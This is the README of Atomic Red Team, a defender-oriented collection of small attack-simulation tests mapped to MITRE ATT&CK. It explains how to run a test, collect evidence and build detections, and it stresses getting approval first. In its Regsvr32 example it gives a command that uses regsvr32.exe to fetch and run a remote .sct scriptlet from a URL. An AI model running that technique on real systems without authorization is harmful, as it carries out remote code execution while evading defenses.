# Atomic Red Team
[![CircleCI](https://circleci.com/gh/redcanaryco/atomic-red-team.svg?style=svg)](https://circleci.com/gh/redcanaryco/atomic-red-team)

Small and highly portable detection tests mapped to the [Mitre ATT&CK Framework.](https://attack.mitre.org/wiki/Main_Page)

*NOTE: We have sweet stickers for people who contribute; if you’re interested send a message to gear@redcanary.com with your mailing address*

## Mitre ATT&CK Matrix

We broke the repository into three working matrices:

[Windows MITRE ATT&CK Matrix](Windows/README.md)

[Mac MITRE ATT&CK Matrix](Mac/README.md)

[Linux MITRE ATT&CK Matrix](Linux/README.md)

## How to use Atomic Red Team

Our Atomic Red Team tests are small, highly portable detection tests mapped to the MITRE ATT&CK Framework. Each test is designed to map back to a particular tactic. We hope that this gives defenders a highly actionable way to immediately start testing their defenses against a broad spectrum of attacks.

* Be sure to get permission and necessary approval before conducting tests. Unauthorized testing is a bad decision, and can potentially be a resume-generating event.

* Set up a test machine that would be similar to the build in your environment. Be sure you have your collection/EDR solution in place, and that the endpoint is checking in and active.

* Spend some time developing a test plan or scenario. This can take many forms. An example test plan could be to execute all the Discovery phase items at once in a batch file, or run each phase one by one, validating coverage as you go.

There are three phases to the testing framework:

![Phases](https://www.redcanary.com/wp-content/uploads/image2-5.png)

### Phase 1: Execute Test

This particular test is fairly easy to exercise, since the tool is default on all Windows workstations.

The details of this test case are [here](Windows/Execution/Regsvr32.md).

Two methods are provided to perform the Atomic Test:

#### Local

For a local simulation use the provided .sct file:

    regsvr32.exe /s /u /i:file.sct scrobj.dll

#### Remote

For a remote simulation you will need a remotely accessible server to grab/download this file, or use gist:

    regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll

### Phase 2: Collect Evidence

What does your security solution observe? You may see a file modification in the user’s profile. You may detect network connections made by regsvr32.exe to an external IP. There may be an entry in the proxy logs. You may observe the scrobj.dll loading on Windows. Or, you might not observe any behavior on the endpoint or network. This is why we test! To identify visibility gaps and determine where improvements need to be made.

![RC Timeline](https://www.redcanary.com/wp-content/uploads/image9-1.png)

![Cb example 1](https://www.redcanary.com/wp-content/uploads/image5-3.png)

![Cb Example 2](https://www.redcanary.com/wp-content/uploads/image7-2.png)

### Phase 3: Develop Detection

So you executed the test and none of your defenses fired – that’s why we test! Based on your observations and detection capabilities, it is time to use what you have to try to detect this event in your environment.

![Unwind Data](https://www.redcanary.com/wp-content/uploads/image8-1.png)

Once the detection is built, it is time to validate that the detection is working and that it is appropriately tuned. If you were to write your detection too broadly and “detect” every regsvr32.exe, you are going to be digging out from a mountain of false positives. But if you write it too narrow and it only detects regsvr32.exe with the exact command line “/s /u /i” then all an attacker has to do is slightly modify the command line to evade your detection.

### Measure Progress

One of the goals is to try to measure your coverage/capabilities against the ATT&CK Matrix and to identify where you may have gaps. Roberto Rodriguez ([@cyb3rWar0g](https://twitter.com/Cyb3rWard0g)) provided [this spreadsheet](https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/blob/master/metrics/HuntTeam_HeatMap.xlsx) and complementary [blog post](https://cyberwardog.blogspot.com/2017/07/how-hot-is-your-hunt-team.html) showcasing how to determine where you stand within your organization in relation the MITRE ATT&CK Matrix.

![HeatMap](https://www.redcanary.com/wp-content/uploads/image4-5.png)

![Measure](https://www.redcanary.com/wp-content/uploads/image6-2.png)




#### We did not create the MITRE ATT&CK Framework, we just think it is awesome and extensive.

#### ATT&CK and ATT&CK Matrix are trademarks of The MITRE Corporation
